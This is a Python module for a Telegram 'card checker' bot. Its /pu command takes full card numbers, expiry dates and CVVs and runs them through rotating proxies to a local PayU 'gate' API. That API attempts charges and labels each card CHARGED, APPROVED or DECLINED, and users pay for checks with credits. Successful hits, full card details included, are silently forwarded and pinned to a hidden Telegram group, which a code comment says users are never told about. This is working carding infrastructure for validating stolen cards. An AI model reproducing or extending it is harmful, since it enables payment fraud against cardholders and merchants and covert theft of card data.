
import asyncio
import re
import logging
import time
import random
import urllib.request, urllib.parse, urllib.error, json, os
from html import escape

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramForbiddenError, TelegramBadRequest

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, get_db_connection
from bin import get_bin_info
from sub import get_premium_status
from proxy_pool import get_user_proxies
from proxy import parse_proxy_input


def _norm_proxy(proxy):
    """DB stores proxies as 'user pass ip port'; convert to a clean http:// URL."""
    try:
        parsed = parse_proxy_input(proxy)
        if parsed and parsed.get("url_format"):
            return parsed["url_format"]
    except Exception:
        pass
    return proxy
from mass_gates._tg_helpers import safe_reply, send_hit

# silent group log for PayU hits (charged/approved -> this group + pinned)
PAYU_GROUP_ID = -1004453592223

# ── PayU API (local, like rz) ──────────────────────────────────────────
PU_API = os.environ.get("PU_API", "http://127.0.0.1:9200")

# ── MinecraftEnchanted custom emoji IDs (fetched from the pack) ────────
EMOJI_DIAMOND   = "5323344825016166715"   # 💎
EMOJI_SHIELD    = "5323325115411245266"   # 🛡
EMOJI_FIRE      = "5323776971740588381"   # 🔥
EMOJI_TROPHY    = "5321299626014323820"   # 🏆
EMOJI_PICKAXE   = "5323815076690440002"   # ⛏️
EMOJI_STAR      = "5321214486877609476"   # ⭐️
EMOJI_COMPASS   = "5323308163175327669"   # 🧭
EMOJI_SWORD     = "5323688349385403680"   # 🗡

CHARGED_EMOJI   = f'<tg-emoji emoji-id="{EMOJI_DIAMOND}">💎</tg-emoji>'
APPROVED_EMOJI  = f'<tg-emoji emoji-id="{EMOJI_SHIELD}">🛡</tg-emoji>'
DECLINED_EMOJI  = f'<tg-emoji emoji-id="{EMOJI_FIRE}">🔥</tg-emoji>'
ERROR_EMOJI     = f'<tg-emoji emoji-id="{EMOJI_TROPHY}">🏆</tg-emoji>'

# Router for this module
router = Router()

user_last_command_time = {}


def _pu_api_check(cc, proxy, amount):
    """Single-card check against the local PayU API. Returns a result dict."""
    q = urllib.parse.urlencode({"cc": cc, "proxy": proxy, "amount": amount, "key": "ladle"})
    url = f"{PU_API}/payu?{q}"
    try:
        resp = urllib.request.urlopen(url, timeout=200)
        data = json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try:
            data = json.loads(e.read().decode())
        except Exception:
            data = {}
        return {"status": "error", "response": data.get("response") or f"HTTP {e.code}",
                "real_response": data.get("real_response") or "ERROR", "amount": "0.00"}
    except Exception as e:
        return {"status": "error", "response": f"Connection error: {str(e)[:60]}",
                "real_response": "ERROR", "amount": "0.00"}
    resp_code = str(data.get("response_code") or data.get("response") or "ERROR").upper()
    status = str(data.get("response") or "error").lower()   # CHARGED/APPROVED/DECLINED/ERROR
    if status not in ("charged", "approved", "declined", "error"):
        status = "error"
    return {
        "status": status,
        "response": resp_code,
        "real_response": str(data.get("real_response") or "N/A"),
        "amount": str(data.get("amount") or "0.00"),
    }


def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    reverse_digits = card_number[::-1]
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0


async def get_user_plan_name(user_id):
    import psycopg2.extras
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute("SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1", (user_id,))
                row = cursor.fetchone()
                conn.close()
                return row['plan'].upper() if row else "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    return "FREE"


def build_user_link(user_obj) -> str:
    name = user_obj.first_name or "User"
    if user_obj.username:
        return f'<a href="https://t.me/{user_obj.username}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'


@router.message(F.text.startswith("/pu"))
async def pu_command(message: types.Message):
    if not await asyncio.to_thread(is_gate_enabled, "pu"):
        await safe_reply(message,
            f"{ERROR_EMOJI} <b>𝗣𝗮𝘆𝗨 𝗚𝗮𝘁𝗲 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗺𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>\n"
            "𝗜𝘁 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗯𝗮𝗰𝗸 𝘀𝗵𝗼𝗿𝘁𝗹𝘆 ⚙️",
            parse_mode="HTML")
        return

    user = message.from_user
    user_id = user.id

    parts = message.text.split(maxsplit=1)
    raw_text = ""
    if len(parts) > 1:
        raw_text = parts[1].strip()
    if message.reply_to_message:
        raw_text += " " + (message.reply_to_message.text or message.reply_to_message.caption or "")

    if not raw_text.strip():
        await safe_reply(message,
            f"{ERROR_EMOJI} <b>Usage:</b> /pu <code>cc|mm|yy|cvv</code>\n"
            "Or reply to a message containing card details.",
            parse_mode="HTML")
        return

    pattern = r'\b(\d{15,16})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{3,4})\b'
    match = re.search(pattern, raw_text)
    if not match:
        await safe_reply(message,
            f"{ERROR_EMOJI} <b>Invalid Card Format.</b>\n"
            "Please provide CC as <code>4242424242424242|05|27|123</code>",
            parse_mode="HTML")
        return

    cc, mm, yy_raw, cvv = match.groups()
    yy = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    amt_match = re.search(r'amount\s*=\s*(\d+(?:\.\d+)?)', raw_text, re.I)
    amount = amt_match.group(1) if amt_match else "1"

    if not luhn_check(cc):
        await safe_reply(message,
            f"{ERROR_EMOJI} <b>Invalid Card</b>\nYour card number is incorrect.",
            parse_mode="HTML")
        return

    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits is None or current_credits <= 0:
        await safe_reply(message,
            f"{ERROR_EMOJI} <b>Insufficient Credits!</b>\n\nYou have 0 credits left.",
            parse_mode="HTML")
        return

    plan_name = await get_user_plan_name(user_id)
    escaped_card = escape(formatted_cc)
    proc_msg = await safe_reply(message,
        f"<pre>{EMOJI_PICKAXE} 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗮𝗿𝗱...</pre>\n"
        f"<b>𝗖𝗮𝗿𝗱 ➠</b> <code>{escaped_card}</code>",
        parse_mode="HTML")

    asyncio.create_task(process_pu_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name, amount))


async def process_pu_check(message, proc_msg, user, user_id, formatted_cc, cc, plan_name, amount="1"):
    start_time = time.time()

    # BIN lookup
    bin_info = {}
    try:
        bin_info = await get_bin_info(cc[:6])
    except Exception:
        bin_info = {}
    bin_scheme = bin_info.get("scheme", "N/A")
    bin_bank = bin_info.get("bank", "N/A")
    country_name = bin_info.get("country", "N/A")
    country_flag = bin_info.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name

    # pull the user's OWN proxy pool (global, not rz_pxy.txt)
    user_proxies = await get_user_proxies(user_id)
    api_result = {"status": "error", "response": "ERROR", "real_response": "ERROR", "amount": "0.00"}

    if not user_proxies:
        api_result = {"status": "error", "response": "NO_PROXY", "real_response": "NO_PROXY", "amount": "0.00"}
    else:
        for _attempt in range(3):
            proxy = _norm_proxy(random.choice(user_proxies))
            try:
                api_result = await asyncio.to_thread(_pu_api_check, formatted_cc, proxy, amount)
            except Exception:
                continue
            if api_result.get("status") != "error":
                break
            # keep trying a different proxy on error
            await asyncio.sleep(0.4)

    status_raw = api_result.get("status", "error").lower()
    res_code = api_result.get("response", "ERROR")
    real_resp = api_result.get("real_response", "N/A")
    amt = api_result.get("amount", "0.00")

    if status_raw == "charged":
        final_status = f"𝗖𝗛𝗔𝗥𝗚𝗘𝗗 {CHARGED_EMOJI}"
        is_charged = True
    elif status_raw == "approved":
        final_status = f"𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 {APPROVED_EMOJI}"
        is_charged = True
    elif status_raw == "declined":
        final_status = f"𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 {DECLINED_EMOJI}"
        is_charged = False
    else:
        final_status = f"𝗘𝗥𝗥𝗢𝗥 {ERROR_EMOJI}"
        is_charged = False

    # credits
    if status_raw == "charged":
        credits_to_deduct = 2
    elif status_raw in ("approved", "declined"):
        credits_to_deduct = 1
    else:
        credits_to_deduct = 0
    if credits_to_deduct > 0:
        balance = await asyncio.to_thread(get_user_credits, user_id)
        new_balance = max(0, balance - credits_to_deduct)
        await asyncio.to_thread(update_credits, user_id, new_balance)

    # stats
    def _sync_stats():
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET cc_checked = cc_checked + 1 WHERE user_id = %s", (user_id,))
        if is_charged:
            cursor.execute("UPDATE users SET cc_charged = cc_charged + 1 WHERE user_id = %s", (user_id,))
        conn.commit()
        conn.close()
    await asyncio.to_thread(_sync_stats)

    user_link = build_user_link(user)
    dev_link = '<a href="https://t.me/Enchanted_linux_0x">Enchanted_linux_0x</a>'
    user_display = f"{user_link} <b>[{plan_name}]</b>"

    final_caption = (
        f"𝗦𝘁𝗮𝘁𝘂𝘀 ➠ {final_status}\n"
        f"𝗖𝗮𝗿𝗱 ➠ <code>{formatted_cc}</code>\n"
        f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➠ 𝗣𝗮𝘆𝗨 ${amt}\n"
        f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➠ <b>{escape(str(res_code))}</b>\n"
        f"𝗥𝗲𝗮𝗹 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➠ <b>{escape(str(real_resp))}</b>\n"
        f"𝗕𝗿𝗮𝗻𝗱 ➠ <b>{bin_scheme}</b>\n"
        f"𝗜𝘀𝘀𝘂𝗲𝗿 ➠ <b>{bin_bank}</b>\n"
        f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➠ <b>{bin_country}</b>\n"
        f"𝗨𝘀𝗲𝗿 ➠ {user_display}\n"
        f"𝗗𝗲𝘃 ➠ {dev_link}"
    )

    # silent group log + pin (user is never told their hit was forwarded)
    if status_raw in ("charged", "approved"):
        try:
            sent = await send_hit(message.bot, PAYU_GROUP_ID, final_caption, None)
            if sent is not None:
                await message.bot.pin_chat_message(chat_id=PAYU_GROUP_ID, message_id=sent.message_id)
        except Exception as e:
            logging.warning(f"[PU] group log failed: {e}")

    try:
        await proc_msg.edit_text(final_caption, parse_mode="HTML", disable_web_page_preview=True)
    except Exception:
        await safe_reply(message, final_caption, parse_mode="HTML", disable_web_page_preview=True)

    logging.info(f"PU command completed in {time.time()-start_time:.2f}s for user {user_id}")
